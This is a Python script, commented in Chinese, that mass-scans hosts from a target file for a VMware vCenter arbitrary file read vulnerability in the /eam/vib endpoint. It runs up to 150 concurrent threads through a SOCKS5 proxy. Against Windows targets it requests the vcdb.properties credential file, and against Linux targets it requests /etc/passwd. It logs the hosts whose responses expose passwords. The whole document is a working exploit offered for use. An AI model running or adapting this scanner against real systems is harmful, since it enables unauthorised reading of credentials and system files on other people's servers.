# conding=utf-8
import requests  # 用于http请求响应
from requests.packages import urllib3
import threading  # 用于并发请求
import re

'''
使用方法：
urls.txt用于存放目标HOST，然后直接运行此脚本即可 python vCenter-info-leak.py
漏洞验证成功的目标存放于success.txt，连接失败的错误信息存放于error.txt中
'''

# 消除安全请求的提示信息,增加重试连接次数
urllib3.disable_warnings()
requests.adapters.DEFAULT_RETRIES = 4
s = requests.session()
s.keep_alive = False  # 关闭连接，防止出现最大连接数限制错误
urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'  # openssl 拒绝短键，防止SSL错误

# 设置最大线程数
thread_max = threading.BoundedSemaphore(value=150)

# HTTP请求-head头
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
}

proxies = {
    'http': 'socks5://127.0.0.1:1080',
    'https': 'socks5://127.0.0.1:1080'
}

targets = []  # 定义目标列表
threads = []  # 定义线程池


def export_success(msg):
    with open('success.txt', 'a') as f:
        f.write(msg + '\n')


def POC(url):
    url_windows = url + "/eam/vib?id=C:\ProgramData\VMware\\vCenterServer\cfg\\vmware-vpx\\vcdb.properties"
    url_linux = url + "/eam/vib?id=/etc/passwd"
    try:
        resp_linux = s.get(url_linux, headers=headers, verify=False, timeout=15)
        resp_linux.encoding = resp_linux.apparent_encoding
        resp_windows = s.get(url_windows, headers=headers, verify=False, timeout=15)
        resp_windows.encoding = resp_windows.apparent_encoding
        if resp_windows.status_code == 200 and "password" in resp_windows.text:
            print(url + " ===> 目标windows,存在漏洞")
            export_success(url_windows)
        elif "root" in resp_linux.text and resp_linux.status_code == 200:
            print(url + " ===> 目标linux,存在漏洞")
            export_success(url_linux)
        else:
            with open('NoVuln.txt', 'a') as f:
                f.write(url + '\n')

    except Exception as ex_poc:
        msg = url + "=====报错了=====" + str(ex_poc)
        with open('./error.txt', 'a') as f:
            f.write(msg + '\n')
    finally:
        thread_max.release()  # 释放锁


def H2U():
    '''输入格式处理，将HOST统一为URL格式'''
    with open('targets.txt', 'r', encoding='utf-8') as f:
        line = f.readlines()
        for host in line:
            host = host.strip()
            if host[0:4] == "http":
                url = host
            else:
                url = "http://" + host
            if url not in targets:
                targets.append(url)  # 去重后加入目标列表


if __name__ == "__main__":
    H2U()
    for url in targets:
        thread_max.acquire()  # 请求锁
        t = threading.Thread(target=POC, args=(url,))
        threads.append(t)
        t.start()
    for i in threads:
        i.join()
